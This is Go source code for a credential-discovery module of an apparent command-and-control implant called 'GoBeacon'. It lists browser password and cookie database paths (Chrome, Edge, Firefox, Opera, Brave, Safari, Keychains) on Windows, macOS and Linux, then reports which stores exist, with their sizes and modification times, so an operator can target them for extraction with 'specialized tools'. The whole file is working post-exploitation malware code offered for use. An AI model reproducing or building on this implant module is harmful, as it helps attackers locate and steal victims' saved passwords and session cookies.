// Browser Credentials module - Discover browser credential stores

func (b *GoBeacon) moduleBrowserCredentials(parameters string) string {
	var result strings.Builder
	result.WriteString("=== BROWSER CREDENTIALS DISCOVERY ===\n")

	browsers := b.getBrowserPaths()
	found := 0

	for browserName, paths := range browsers {
		result.WriteString(fmt.Sprintf("\n--- %s ---\n", browserName))

		for _, path := range paths {
			if _, err := os.Stat(path); err == nil {
				result.WriteString(fmt.Sprintf("Found database: %s\n", path))

				// Basic analysis without actually reading credentials
				if strings.Contains(path, "Login Data") || strings.Contains(path, "logins.json") {
					result.WriteString("  Type: Password database\n")
					found++
				} else if strings.Contains(path, "Cookies") {
					result.WriteString("  Type: Cookie database\n")
					found++
				}

				if info, err := os.Stat(path); err == nil {
					result.WriteString(fmt.Sprintf("  Size: %d bytes\n", info.Size()))
					result.WriteString(fmt.Sprintf("  Modified: %s\n", info.ModTime().Format("2006-01-02 15:04:05")))
				}
			}
		}
	}

	result.WriteString(fmt.Sprintf("\nTotal credential stores found: %d\n", found))
	result.WriteString("Note: Use specialized tools to extract encrypted credentials\n")

	return result.String()
}

func (b *GoBeacon) getBrowserPaths() map[string][]string {
	browsers := make(map[string][]string)

	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		localAppData := os.Getenv("LOCALAPPDATA")

		browsers["Chrome"] = []string{
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data"),
			filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(appData, "Mozilla", "Firefox", "Profiles"),
		}
		browsers["Edge"] = []string{
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
		}
		browsers["Opera"] = []string{
			filepath.Join(appData, "Opera Software", "Opera Stable", "Login Data"),
		}
		browsers["Brave"] = []string{
			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
		}

	} else if runtime.GOOS == "darwin" {
		homeDir, _ := os.UserHomeDir()

		browsers["Chrome"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
			filepath.Join(homeDir, "Library", "Application Support", "Google", "Chrome", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "Firefox", "Profiles"),
		}
		browsers["Safari"] = []string{
			filepath.Join(homeDir, "Library", "Cookies", "Cookies.binarycookies"),
			filepath.Join(homeDir, "Library", "Keychains"),
		}
		browsers["Opera"] = []string{
			filepath.Join(homeDir, "Library", "Application Support", "com.operasoftware.Opera", "Login Data"),
		}

	} else {
		homeDir, _ := os.UserHomeDir()

		browsers["Chrome"] = []string{
			filepath.Join(homeDir, ".config", "google-chrome", "Default", "Login Data"),
			filepath.Join(homeDir, ".config", "google-chrome", "Default", "Cookies"),
		}
		browsers["Firefox"] = []string{
			filepath.Join(homeDir, ".mozilla", "firefox"),
		}
		browsers["Opera"] = []string{
			filepath.Join(homeDir, ".config", "opera", "Login Data"),
		}
		browsers["Brave"] = []string{
			filepath.Join(homeDir, ".config", "BraveSoftware", "Brave-Browser", "Default", "Login Data"),
		}
	}

	return browsers
}
